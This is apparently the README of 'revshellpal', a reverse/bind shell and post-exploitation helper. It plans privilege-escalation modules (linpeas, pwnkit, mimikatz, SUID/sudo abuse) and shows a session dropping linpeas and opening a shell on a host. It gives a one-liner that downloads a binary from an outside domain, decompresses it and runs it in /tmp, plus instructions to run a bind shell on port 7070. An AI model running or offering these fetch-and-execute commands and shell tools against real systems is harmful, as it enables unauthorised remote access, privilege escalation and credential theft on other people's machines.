# f11
*revshellpal*

### TODO

- linpeas (all peas)
  - other similar enum?
- pwnkit
- mimikatz (windows)
- SUID/SUDO/CAP/
- SHELL


```
💀 Ӻ11> linpeas
/tmp/.f11/linpeas.sh - 100.00% (0.74 MB) of total size: 0.74 MB
💀 Ӻ11> workdir
Command not found: 'workdir'
💀 Ӻ11> help
Command not found: 'help'
💀 Ӻ11> commands
Command not found: 'commands'
💀 Ӻ11> plugins
Command not found: 'plugins'
💀 Ӻ11> download
Command not found: 'download'
💀 Ӻ11> upload
Command not found: 'upload'
💀 Ӻ11> shell
charlie@galactica:/tmp$ exit

💀 Ӻ11> 
```

### Oneliner

```bash
rm /tmp/f11; curl -sL https://f11snipe.cloud/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
rm /tmp/f11*; curl -sL http://localhost:8000/dist/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11 2>&1 >> /tmp/f11.log &
```


### Run included standalone bind shell

```bash
# Extract archive
xz -d f11-bind.xz

# Allow execute
chmod +x f11-bind

# Run rev bind shell (port 7070)
./f11-bind
```

### Build from source

```bash
# Run all build steps
npm install
npm run ci
```


#### Individual build steps
```bash
# Install npm packages
npm install

# Build TypeScript
npm build

# Compile
npm run compile

# Compress
npm run compress
```
